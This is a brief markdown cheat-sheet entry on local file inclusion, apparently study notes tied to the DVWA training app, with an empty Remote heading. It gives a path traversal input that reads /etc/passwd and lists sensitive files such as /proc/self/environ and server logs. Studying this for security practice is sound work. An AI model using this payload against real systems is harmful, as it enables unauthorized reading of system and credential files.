## File Inclusion

### Local
- Exploit
  - Modify ```?page=include.php``` to ```?page=../../../../../etc/passwd```
- Intersting files
  - /proc/self/environ
  - /var/log/auth.log
  - /var/log/apache2/access.log  
- Example
  - [DVWA](/Web/BuggyApp/DVWA/file-inclusion.md)  

### Remote

